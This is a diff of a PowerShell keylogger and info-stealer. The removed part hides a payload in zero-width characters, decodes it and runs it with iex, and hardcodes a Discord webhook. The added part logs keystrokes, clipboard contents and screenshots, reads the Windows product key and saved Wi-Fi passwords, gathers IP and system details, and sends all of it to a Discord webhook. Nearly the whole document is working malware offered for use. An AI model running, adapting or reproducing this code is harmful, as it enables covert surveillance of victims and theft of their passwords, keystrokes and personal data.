@@ -1,56 +1,210 @@
-########################################################################
-$a="";$b="";$c="";$d="";$e="";$f="";$g="";$h="";$i="";$j="​​​​‌‌​‌​​​​‌​‌​​​‌​​‌​​​‌‌‌​‌​‌​‌‌‌​​‌​​‌‌​‌‌​​​​‌​​​​​​​‌‌‌‌​‌​​‌​​​​​​​‌​​​‌​​‌‌​‌​​​​‌‌‌​‌​​​‌‌‌​‌​​​‌‌‌​​​​​‌‌‌​​‌‌​​‌‌‌​‌​​​‌​‌‌‌‌​​‌​‌‌‌‌​‌‌‌​‌‌‌​‌‌‌​‌‌‌​‌‌‌​‌‌‌​​‌​‌‌‌​​‌‌‌‌​​‌​‌‌​‌‌‌‌​‌‌‌​‌​‌​‌‌‌​‌​​​‌‌‌​‌​‌​‌‌​​​‌​​‌‌​​‌​‌​​‌​‌‌‌​​‌‌​​​‌‌​‌‌​‌‌‌‌​‌‌​‌‌​‌​​‌​‌‌‌‌​‌‌‌​‌‌‌​‌‌​​​​‌​‌‌‌​‌​​​‌‌​​​‌‌​‌‌​‌​​​​​‌‌‌‌‌‌​‌‌‌​‌‌​​​‌‌‌‌​‌​‌‌​​‌​​​‌​‌​​​‌​‌‌‌​‌‌‌​​‌‌​‌​​​‌‌‌​‌‌‌​​‌‌‌​​‌​‌​‌​‌‌‌​‌‌​​‌‌‌​‌​‌‌​​​​‌‌​​​‌‌​‌​‌​​​‌​​‌​​​‌​​​​​‌‌​‌​​​​‌​‌​​‌​‌​​‌‌​‌‌‌​‌​​​‌‌​​​​‌​‌‌‌​​‌​​‌‌‌​‌​​​​‌​‌‌​‌​‌​‌​​​​​‌‌‌​​‌​​‌‌​‌‌‌‌​‌‌​​​‌‌​‌‌​​‌​‌​‌‌‌​​‌‌​‌‌‌​​‌‌​​‌​​​​​​​‌​​‌​​​‌‌‌​‌​‌​‌‌‌​​‌​​‌‌​‌‌​​​​​​‌‌​‌​​​​‌​‌​​‌​‌​​‌‌​‌‌‌​‌​​​‌‌​​​​‌​‌‌‌​​‌​​‌‌‌​‌​​​​‌​‌‌​‌​‌​‌​​‌‌​‌‌​‌‌​​​‌‌​​‌​‌​‌‌​​‌​‌​‌‌‌​​​​​​‌​​​​​​​‌​‌‌​‌​‌​‌​​‌‌​‌‌​​‌​‌​‌‌​​​‌‌​‌‌​‌‌‌‌​‌‌​‌‌‌​​‌‌​​‌​​​‌‌‌​​‌‌​​‌​​​​​​​‌‌​​‌​​​​​‌‌​‌​​​​‌​‌​​‌​​​​​‌​‌‌​​‌​​​‌‌​​‌​​​​‌​‌‌​‌​‌​‌​‌​​​‌‌‌‌​​‌​‌‌‌​​​​​‌‌​​‌​‌​​‌​​​​​​​‌​‌‌​‌​‌​​​​​‌​‌‌‌​​‌‌​‌‌‌​​‌‌​‌‌​​‌​‌​‌‌​‌‌​‌​‌‌​​​‌​​‌‌​‌‌​​​‌‌‌‌​​‌​‌​​‌‌‌​​‌‌​​​​‌​‌‌​‌‌​‌​‌‌​​‌​‌​​‌​​​​​​‌​‌​​‌‌​‌‌‌‌​​‌​‌‌‌​​‌‌​‌‌‌​‌​​​‌‌​​‌​‌​‌‌​‌‌​‌​​‌​‌‌‌​​‌​‌​‌‌‌​‌‌​‌​​‌​‌‌​‌‌‌​​‌‌​​‌​​​‌‌​‌‌‌‌​‌‌‌​‌‌‌​‌‌‌​​‌‌​​‌​‌‌‌​​‌​​​‌‌​​‌‌​‌‌‌‌​‌‌‌​​‌​​‌‌​‌‌​‌​‌‌‌​​‌‌​​​​‌‌​‌​​​​‌​‌​​‌​‌​​‌‌​‌‌‌​‌​​​‌‌​​​​‌​‌‌‌​​‌​​‌‌‌​‌​​​​‌​‌‌​‌​‌​‌​​‌‌​‌‌​‌‌​​​‌‌​​‌​‌​‌‌​​‌​‌​‌‌‌​​​​​​‌​​​​​​​‌​‌‌​‌​‌​‌​​‌‌​‌‌​​‌​‌​‌‌​​​‌‌​‌‌​‌‌‌‌​‌‌​‌‌‌​​‌‌​​‌​​​‌‌‌​​‌‌​​‌​​​​​​​‌‌​​​‌​​​​‌‌​‌​​​​‌​‌​​‌​‌‌​‌‌​‌​‌​​‌‌​‌‌‌‌​​‌​‌‌‌​​‌‌​‌‌‌​‌​​​‌‌​​‌​‌​‌‌​‌‌​‌​​‌​‌‌‌​​‌​‌​‌‌‌​‌‌​‌​​‌​‌‌​‌‌‌​​‌‌​​‌​​​‌‌​‌‌‌‌​‌‌‌​‌‌‌​‌‌‌​​‌‌​​‌​‌‌‌​​‌​​​‌‌​​‌‌​‌‌‌‌​‌‌‌​​‌​​‌‌​‌‌​‌​‌‌‌​​‌‌​​‌​‌‌‌​​‌​‌​​‌‌​‌‌​​‌​‌​‌‌​‌‌‌​​‌‌​​‌​​​‌​​‌​‌‌​‌‌​​‌​‌​‌‌‌‌​​‌​‌‌‌​​‌‌​‌​‌‌‌​‌​​‌‌‌​‌​​​‌‌‌​‌​​‌​‌​​‌‌​‌‌​​‌​‌​‌‌​‌‌‌​​‌‌​​‌​​​‌​‌​‌‌‌​‌‌​​​​‌​‌‌​‌​​‌​‌‌‌​‌​​​​‌​‌​​​​​‌​​​‌​​‌‌‌‌​‌‌​‌​​​‌‌​​​‌‌​​​‌​​‌‌​​​‌​‌‌‌‌‌​‌​​‌​​​‌​​​‌​‌​​‌​​​​‌‌​‌​​​​‌​‌​​‌​‌​​‌‌​‌‌‌​‌​​​‌‌​​​​‌​‌‌‌​​‌​​‌‌‌​‌​​​​‌​‌‌​‌​‌​‌​​‌‌​‌‌​‌‌​​​‌‌​​‌​‌​‌‌​​‌​‌​‌‌‌​​​​​​‌​​​​​​​‌​‌‌​‌​‌​‌​​‌‌​‌‌​​‌​‌​‌‌​​​‌‌​‌‌​‌‌‌‌​‌‌​‌‌‌​​‌‌​​‌​​​‌‌‌​​‌‌​​‌​​​​​​​‌‌​​​‌​​​​‌‌​‌​​​​‌​‌​​‌​‌‌​‌‌​‌​‌​​‌‌​‌‌‌‌​​‌​‌‌‌​​‌‌​‌‌‌​‌​​​‌‌​​‌​‌​‌‌​‌‌​‌​​‌​‌‌‌​​‌​‌​‌‌‌​‌‌​‌​​‌​‌‌​‌‌‌​​‌‌​​‌​​​‌‌​‌‌‌‌​‌‌‌​‌‌‌​‌‌‌​​‌‌​​‌​‌‌‌​​‌​​​‌‌​​‌‌​‌‌‌‌​‌‌‌​​‌​​‌‌​‌‌​‌​‌‌‌​​‌‌​​‌​‌‌‌​​‌​‌​​‌‌​‌‌​​‌​‌​‌‌​‌‌‌​​‌‌​​‌​​​‌​​‌​‌‌​‌‌​​‌​‌​‌‌‌‌​​‌​‌‌‌​​‌‌​‌​‌‌‌​‌​​‌‌‌​‌​​​‌‌‌​‌​​‌​‌​​‌‌​‌‌​​‌​‌​‌‌​‌‌‌​​‌‌​​‌​​​‌​‌​‌‌‌​‌‌​​​​‌​‌‌​‌​​‌​‌‌‌​‌​​​​‌​‌​​​​​‌​​​‌​​‌‌​​‌‌​​​‌​​​‌​​​‌​‌​​‌​​​​‌‌​‌​​​​‌​‌​​‌​​​​​‌​‌‌​​‌​​​‌‌​​‌​​​​‌​‌‌​‌​‌​‌​‌​​​‌‌‌‌​​‌​‌‌‌​​​​​‌‌​​‌​‌​​‌​​​​​​​‌​‌‌​‌​‌​​​​​‌​‌‌‌​​‌‌​‌‌‌​​‌‌​‌‌​​‌​‌​‌‌​‌‌​‌​‌‌​​​‌​​‌‌​‌‌​​​‌‌‌‌​​‌​‌​​‌‌‌​​‌‌​​​​‌​‌‌​‌‌​‌​‌‌​​‌​‌​​‌​​​​​​‌​‌​​‌‌​‌‌‌‌​​‌​‌‌‌​​‌‌​‌‌‌​‌​​​‌‌​​‌​‌​‌‌​‌‌​‌​​‌​‌‌‌​​‌​‌​‌‌‌​‌‌​‌​​‌​‌‌​‌‌‌​​‌‌​​‌​​​‌‌​‌‌‌‌​‌‌‌​‌‌‌​‌‌‌​​‌‌​​‌​‌‌‌​​‌​​​‌‌​​‌‌​‌‌‌‌​‌‌‌​​‌​​‌‌​‌‌​‌​‌‌‌​​‌‌​​​​‌‌​‌​​​​‌​‌​​‌​‌‌​‌‌​‌​‌​​‌‌​‌‌‌‌​​‌​‌‌‌​​‌‌​‌‌‌​‌​​​‌‌​​‌​‌​‌‌​‌‌​‌​​‌​‌‌‌​​‌​‌​‌‌‌​‌‌​‌​​‌​‌‌​‌‌‌​​‌‌​​‌​​​‌‌​‌‌‌‌​‌‌‌​‌‌‌​‌‌‌​​‌‌​​‌​‌‌‌​​‌​​​‌‌​​‌‌​‌‌‌‌​‌‌‌​​‌​​‌‌​‌‌​‌​‌‌‌​​‌‌​​‌​‌‌‌​​‌​​‌‌​‌​‌‌​​‌​‌​‌‌‌​​‌‌​‌‌‌​​‌‌​‌‌​​​​‌​‌‌​​‌‌‌​‌‌​​‌​‌​‌​​​​‌​​‌‌​‌‌‌‌​‌‌‌‌​​​​‌​‌‌‌​‌​​‌‌‌​‌​​​‌‌‌​‌​​‌​‌​​‌‌​‌‌​‌​​​​‌‌​‌‌‌‌​‌‌‌​‌‌‌​​‌​‌​​​​​‌​​‌‌‌​‌​‌​​‌‌​‌‌​‌​​‌​‌‌​‌‌​​​‌‌​‌‌​​​‌‌‌‌​​‌​​‌​​​​​​‌​‌​​‌‌​‌‌​‌​‌‌​‌‌​‌​​‌​‌‌​​‌​​​​‌​‌‌​​​​‌​​​​​​‌‌‌‌​​‌​‌‌​‌‌‌‌​‌‌‌​‌​‌​​‌​​​​​​‌‌‌​​‌​​‌‌​​‌​‌​‌‌​​​​‌​‌‌​‌‌​​​‌‌​‌‌​​​‌‌‌‌​​‌​​‌​​​​​​‌‌‌​‌​​​‌‌​‌​​​​‌‌​‌​​‌​‌‌​‌‌‌​​‌‌​‌​‌‌​​‌​​​​​​‌‌‌​‌‌‌​‌‌​​‌​‌​​‌​​​​​​‌‌‌​‌‌‌​‌‌​‌‌‌‌​‌‌‌​‌​‌​‌‌​‌‌​​​‌‌​​‌​​​​‌​​​​​​‌‌​​‌‌‌​‌‌​‌​​‌​‌‌‌​‌‌​​‌‌​​‌​‌​​‌​​​​​​‌‌‌‌​​‌​‌‌​‌‌‌‌​‌‌‌​‌​‌​​‌​​​​​​‌‌​​​​‌​​‌​​​​​​‌‌​‌​‌‌​‌‌​​‌​‌​‌‌‌‌​​‌​‌‌​‌‌​​​‌‌​‌‌‌‌​‌‌​​‌‌‌​‌‌​​‌‌‌​‌‌​​‌​‌​‌‌‌​​‌​​​‌‌‌‌‌‌​​‌​​‌‌‌​​‌​‌‌​​​​‌​​​​​​​‌​​‌‌‌​‌​‌​​‌‌​‌​​‌​‌‌​‌​​‌​​‌​‌​​​‌​​​​‌​​​​​​‌​​​​​‌​‌​​‌‌​​​‌​​​‌​‌​‌​‌​​‌​​‌​‌​‌​​​​‌​​‌‌‌​​‌​‌‌​​​​‌​​​​​​‌​‌‌​‌‌​‌​‌​​‌‌​‌‌‌‌​​‌​‌‌‌​​‌‌​‌‌‌​‌​​​‌‌​​‌​‌​‌‌​‌‌​‌​​‌​‌‌‌​​‌​‌​‌‌‌​‌‌​‌​​‌​‌‌​‌‌‌​​‌‌​​‌​​​‌‌​‌‌‌‌​‌‌‌​‌‌‌​‌‌‌​​‌‌​​‌​‌‌‌​​‌​​​‌‌​​‌‌​‌‌‌‌​‌‌‌​​‌​​‌‌​‌‌​‌​‌‌‌​​‌‌​​‌​‌‌‌​​‌​​‌‌​‌​‌‌​​‌​‌​‌‌‌​​‌‌​‌‌‌​​‌‌​‌‌​​​​‌​‌‌​​‌‌‌​‌‌​​‌​‌​‌​​​​‌​​‌‌​‌‌‌‌​‌‌‌‌​​​​‌​​​​‌​​‌‌‌​‌​‌​‌‌‌​‌​​​‌‌‌​‌​​​‌‌​‌‌‌‌​‌‌​‌‌‌​​‌‌‌​​‌‌​‌​‌‌‌​‌​​‌‌‌​‌​​​‌‌‌​‌​​‌​​‌‌‌‌​‌​​‌​‌‌​​‌​‌‌​​​​‌​​​​​​‌​‌‌​‌‌​‌​‌​​‌‌​‌‌‌‌​​‌​‌‌‌​​‌‌​‌‌‌​‌​​​‌‌​​‌​‌​‌‌​‌‌​‌​​‌​‌‌‌​​‌​‌​‌‌‌​‌‌​‌​​‌​‌‌​‌‌‌​​‌‌​​‌​​​‌‌​‌‌‌‌​‌‌‌​‌‌‌​‌‌‌​​‌‌​​‌​‌‌‌​​‌​​​‌‌​​‌‌​‌‌‌‌​‌‌‌​​‌​​‌‌​‌‌​‌​‌‌‌​​‌‌​​‌​‌‌‌​​‌​​‌‌​‌​‌‌​​‌​‌​‌‌‌​​‌‌​‌‌‌​​‌‌​‌‌​​​​‌​‌‌​​‌‌‌​‌‌​​‌​‌​‌​​​​‌​​‌‌​‌‌‌‌​‌‌‌‌​​​​‌​​‌​​‌​‌‌​​​‌‌​‌‌​‌‌‌‌​‌‌​‌‌‌​​‌​‌‌‌​‌​​‌‌‌​‌​​​‌‌‌​‌​​‌​​‌​​‌​‌‌​‌‌‌​​‌‌​​‌‌​​‌‌​‌‌‌‌​‌‌‌​​‌​​‌‌​‌‌​‌​‌‌​​​​‌​‌‌‌​‌​​​‌‌​‌​​‌​‌‌​‌‌‌‌​‌‌​‌‌‌​​​‌​‌​​‌​​​​‌‌​‌​​​​‌​‌​";$k="";$l="";
-$l="";# Author     : InfoSecREDD
-$m="";# Version    : 1.1
-$n="";# Description: isKeylogger?
-$o="";$p="";$q="";$r="";$s="";$t="";$u="";$v="";$w="";$x="";$y="";$z="";
-########################################################################
-
-$DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1275636071421448254/yfVS5vYWNKMHnPvEKgRnB95EZ84MXzfoVxoY5ytgNLW6k_DKx3tCmP6nMvR22G-p6uZW"
-
-###################################################################
-$k="explorer";$inf="keyboard";$c="reporting";$p=${k};$w=$inf;$chk=${w};
-$b=$l;if($PSVersionTable.PSVersion -lt [version]'5.5'){$u=${k};$w=$m;
-${d}=$n;exit;$a=$k;$b=$l;$h=$r;$i="Startup &"};$h=$r;$i=$s;$Start="${k}";
-$z=[char]0x200B;$n=[char]0x200C;function D{param($E)$b=$E-replace$z,'0'-replace$n,'1';
-$k=${a};$l=$b;${m}=$c;$n=$d;${o}= Write-Output "Check";$p=$f;$q=$g;$r=${h};$s=$i;
-$a=@();$t=1;$e=4;$i=9;$w=2;$x="Diagnosis";$y=6;$e=${o};$v=3;$x=5;$r=${h};
-$f=$p;$g=$q;[regex]::Matches($b,"[01]{8}")|%{$a+=[convert]::ToByte($_.Value,2)};
-$e=${o};$f=$p;[System.Text.Encoding]::ASCII.GetString($a)};$h=$r;$d=(D ${j});
-${a}=$k;$b=$l;[System.Diagnostics.Stopwatch]::StartNew().Stop();iex ${d} >$null;
-$y=${6};$z=${7};$w=${4};$o=$e; Write-Output $null; $t=${1};$n=$d;
-${v}=3;$x=5;$r=${h};$m=${c};$p=$f;$u=2;exit;$k;$q=$g;$k=${a};$s=${i};
-[Math]::Abs(-5); $t=${1};Write-Output $null;[Math]::Abs(+60); $t=${1};
-###################################################################
-
-
-
-function LowLevelKeyboardProc($nCode, $wParam, $lParam) {
-    if ($nCode -ge 0 -and $wParam -eq 0x100) {
-        $key = [System.Windows.Forms.Keys]::InteropCast([System.IntPtr]$lParam)
-        Write-Host "Key Pressed: $key"
-        Send-ToDiscord -Message "Key Pressed: $key"
-    }
-    return [System.Windows.Forms.NativeMethods]::CallNextHookEx([System.IntPtr]::Zero, $nCode, $wParam, $lParam)
+# Check if the URL needs to be shortened
+if ($dc.Ln -ne 121) {
+    $dc = (Invoke-RestMethod -Uri $dc).url
 }
-function Send-ToDiscord {
+
+# Import the necessary Windows API functions to control window visibility and capture keyboard input
+$Async = @"
+[DllImport("user32.dll")] 
+public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
+"@
+$Type = Add-Type -MemberDefinition $Async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
+
+$API = @"
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+"@
+$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
+
+# Set up the stopwatch for keypress detection
+$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
+$KeypressThreshold = [TimeSpan]::FromSeconds(10)
+
+# Function to capture a screenshot
+function Capture-Screenshot {
+    Add-Type -AssemblyName System.Drawing
+    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+    $stream = New-Object System.IO.MemoryStream
+    $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
+    $stream.ToArray()
+}
+
+# Function to get system information
+function Get-SystemInfo {
+    $sysinfo = @{
+        "OS" = [System.Environment]::OSVersion.VersionString
+        "Architecture" = [System.Environment]::Is64BitOperatingSystem ? "64-bit" : "32-bit"
+        "MachineName" = [System.Environment]::MachineName
+        "UserName" = [System.Environment]::UserName
+        "CPU" = (Get-WmiObject -Class Win32_Processor).Name
+        "RAM" = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
+    }
+    $sysinfo
+}
+
+# Function to get Windows activation key (requires administrative privileges)
+function Get-WindowsKey {
+    $keyPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+    $key = Get-ItemProperty -Path $keyPath -Name DigitalProductId
+    $key = $key.DigitalProductId
+    $key = [System.Text.Encoding]::Unicode.GetString($key, 52, 16)
+    return $key
+}
+
+# Function to get the internal IP address
+function Get-InternalIP {
+    $ipAddresses = [System.Net.Dns]::GetHostAddresses([System.Environment]::MachineName)
+    $internalIP = $ipAddresses | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1
+    return $internalIP.IPAddressToString
+}
+
+# Function to get the public IP address
+function Get-PublicIP {
+    try {
+        $response = Invoke-RestMethod -Uri "https://api.ipify.org?format=json"
+        return $response.ip
+    } catch {
+        return "Unable to retrieve IP"
+    }
+}
+
+# Function to get Wi-Fi information
+function Get-WifiInfo {
+    try {
+        $wifiInfo = netsh wlan show profile | Select-String "All User Profile" | ForEach-Object {
+            $_ -replace '^\s+All User Profile\s*:\s*', ''
+        }
+
+        $wifiPasswords = @()
+        foreach ($profile in $wifiInfo) {
+            $profileName = $profile.Trim()
+            $details = netsh wlan show profile "$profileName" key=clear
+            if ($details -match "Key Content\s*:\s*(.+)") {
+                $password = $matches[1]
+            } else {
+                $password = "No password found"
+            }
+            $wifiPasswords += "$profileName: $password"
+        }
+
+        return $wifiPasswords -join "`n"
+    } catch {
+        return "Unable to retrieve Wi-Fi information"
+    }
+}
+
+# Function to send a message to Discord webhook
+function Send-DiscordMessage {
     param (
+        [string]$WebhookUrl,
         [string]$Message
     )
-    $Body = @{
+    
+    $payload = @{
         content = $Message
-    }
-    Invoke-RestMethod -Method Post -Uri $DISCORD_WEBHOOK -Body (ConvertTo-Json $Body) -ContentType "application/json"
+    } | ConvertTo-Json
+
+    Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "application/json" -Body $payload
 }
 
-$hookType = [System.Windows.Forms.NativeMethods]::SetWindowsHookEx(0x0D, [System.Windows.Forms.NativeMethods+HookProc]::new($script:LowLevelKeyboardProc), [System.IntPtr]::Zero, 0)
+# Get system information
+$systemInfo = Get-SystemInfo
+$publicIP = Get-PublicIP
+$internalIP = Get-InternalIP
+$windowsKey = Get-WindowsKey
+$wifiInfo = Get-WifiInfo
 
-try {
-    Write-Host "Press Ctrl+C to exit..."
-    while ($true) {
-        Start-Sleep -Seconds 1
+# Send initial message to Discord
+$initialMessage = @"
+**Key Logger Started.**
+
+**Computer Information**
+PC OS: $($systemInfo.OS)
+OS Archit: $($systemInfo.Architecture)
+Win Key: $windowsKey
+PC CPU: $($systemInfo.CPU)
+PC RAM: $($systemInfo.RAM) GB
+
+**Script Information**
+Log Path : $(Get-Location)
+
+**User Information**
+Username: $($systemInfo.UserName)
+PC Name: $($systemInfo.MachineName)
+Ext IP: $publicIP
+Int IP: $internalIP
+
+**Wi:Fi Password Information**
+$wifiInfo
+"@
+
+Send-DiscordMessage -WebhookUrl $dc -Message $initialMessage
+
+# Main loop
+While ($true) {
+    $keyPressed = $false
+    $clipboardContent = Get-ClipboardContent
+
+    try {
+        # Check for keypresses
+        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
+            Start-Sleep -Milliseconds 30
+            for ($asc = 8; $asc -le 254; $asc++) {
+                $keyst = $API::GetAsyncKeyState($asc)
+                if ($keyst -eq -32767) {
+                    $keyPressed = $true
+                    $LastKeypressTime.Restart()
+                    $null = [console]::CapsLock
+                    $vtkey = $API::MapVirtualKey($asc, 3)
+                    $kbst = New-Object Byte[] 256
+                    $checkkbst = $API::GetKeyboardState($kbst)
+                    $logchar = New-Object -TypeName System.Text.StringBuilder
+                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
+                        $LString = $logchar.ToString()
+                        switch ($asc) {
+                            8 { $LString = "[BKSP]" }
+                            13 { $LString = "[ENT]" }
+                            27 { $LString = "[ESC]" }
+                            default { }
+                        }
+                        $send += $LString
+                    }
+                }
+            }
+        }
     }
-}
-finally {
-    [System.Windows.Forms.NativeMethods]::UnhookWindowsHookEx($hookType)
+    finally {
+        if ($keyPressed -or $clipboardContent) {
+            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
+
+            $screenshotBytes = Capture-Screenshot
+            $screenshotBase64 = [Convert]::ToBase64String($screenshotBytes)
+
+            $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+            $escmsgsys += "`nClipboard: $clipboardContent"
+
+            $jsonsys = @{
+                "username" = "$env:COMPUTERNAME"
+                "content" = "$timestamp : `n$escmsgsys`nSystem Info: $(ConvertTo-Json $systemInfo)`nPublic IP: $publicIP"
+                "screenshot" = $screenshotBase64
+            } | ConvertTo-Json
+
+            # Send data to Discord webhook
+            Send-DiscordMessage -WebhookUrl $dc -Message $jsonsys
+            $send = ""
+            $keyPressed = $false
+        }
+    }
+
+    $LastKeypressTime.Restart()
+    Start-Sleep -Milliseconds 10
 }
